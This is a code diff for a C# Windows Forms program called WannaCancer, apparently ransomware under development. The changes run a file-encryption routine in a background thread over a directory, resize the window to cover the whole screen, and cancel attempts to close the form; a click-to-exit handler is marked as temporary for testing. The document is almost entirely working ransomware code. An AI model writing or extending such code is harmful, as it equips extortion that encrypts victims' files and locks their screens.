@@ -5,22 +5,30 @@ using System.Data;
 using System.Drawing;
 using System.Linq;
 using System.Text;
-using System.Threading.Tasks;
+using System.Threading;
 using System.Windows.Forms;
 using System.IO;
+using System.Diagnostics;
 
 namespace WannaCancer3._0
 {
     public partial class WannaCancer : Form
     {
         Random rand = new Random();
+        Thread encrypt;
         private int keygen;
         public WannaCancer()
         {
             InitializeComponent();
-            
-            StartEncrypt();
-           
+            MakeFullScreen();
+
+            encrypt = new Thread(StartEncrypt);
+            encrypt.Start();       
+        }
+
+        private void MakeFullScreen()
+        {
+            Size = new Size(Screen.PrimaryScreen.Bounds.Width, Screen.PrimaryScreen.Bounds.Height);
         }
 
         private void StartEncrypt()
@@ -35,13 +43,12 @@ namespace WannaCancer3._0
             //}
 
             Encrypt(@"C:\Files\Test\");
+
+            Thread.Sleep(60000);
             Environment.Exit(0);
         }
         
-        /// <summary>
-        /// Encrypt Process
-        /// </summary>
-        /// <param name="path"></param>
+
         private void Encrypt(string path)
         {
             string[] directories = Directory.GetDirectories(path);
@@ -93,6 +100,17 @@ namespace WannaCancer3._0
             {
                 return;
             }
+        }
+
+        private void WannaCancer_FormClosing(object sender, FormClosingEventArgs e)
+        {
+            e.Cancel = true;
+        }
+
+        //Likely will removed after testing
+        private void WannaCancer_Click(object sender, EventArgs e)
+        {
+            Environment.Exit(0);
         }
     }
 }
